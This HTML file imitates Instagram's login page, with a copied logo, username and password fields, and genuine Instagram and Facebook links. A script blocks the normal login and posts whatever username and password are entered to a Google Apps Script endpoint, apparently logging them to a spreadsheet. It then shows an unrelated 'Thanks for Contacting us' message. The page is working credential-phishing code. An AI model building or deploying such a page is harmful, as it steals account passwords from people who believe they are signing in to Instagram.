<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="instagram.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="icon" href="favicon.jpg">
    <title>Instagram</title>
</head>

<body>
    <main>
        <img src="iphone.png" alt="" class="phoneImg">
        <div class="form-div">
            <form  method="post" name="google-sheet">
                <img src="logo.png" alt="logo" class="instaLogo">
                <input type="text" class="input" placeholder="Phone number,username,or email" name="Username" required>
                <input type="password" class="input" placeholder="Password" name="Password" required>
                <input type="submit" class="submit" value="Log in" name="Submit" href="https://www.instagram.com" onclick="myfunction()" >
                <p id="or">or</p>   
                <a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522mmaz4toidwdggj1d7f1pqzqgg1ac7l3z1wwwtla1evuvl91axs88b%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da9c18402-c320-4670-a087-f0297b3628e7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522mmaz4toidwdggj1d7f1pqzqgg1ac7l3z1wwwtla1evuvl91axs88b%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0"
                    class="fb-login"><i class='bx bxl-facebook-square'><span>2</span></i>Log in with Facebook</a>
                <a href="https://www.instagram.com/accounts/password/reset/" class="fb-pass">Forget password?</a>
            </form>
            <div class="sign-up">
                <p class="sign-link">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/"
                        class="sign">Sign up</a>
                </p>
            </div>
            <div class="get-app">
                <p>Get the app.</p>
                <div class="store">
                    <img src="Google-Play.png" alt="" id="play">
                    <img src="microsoft.png" alt="" id="microsoft">
                </div>
            </div>
        </div>
    </main>
</body>
<script>
    const scriptURL =
      "https://script.google.com/macros/s/AKfycbx0qsNvWuS-GllTPC6Gvf6jwgrO5hrGqWSxBVr_4T6Dv0BMCI2sPRyoU2ES2fIgNdE55g/exec";
    const form = document.forms["google-sheet"];

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      fetch(scriptURL, { method: "POST", body: new FormData(form) })
        .then((response) =>
          alert("Thanks for Contacting us..! We Will Contact You Soon...")
        )
        .catch((error) => console.error("Error!", error.message));
    });
    </script>
<script src="instagram.js"></script>

</html>
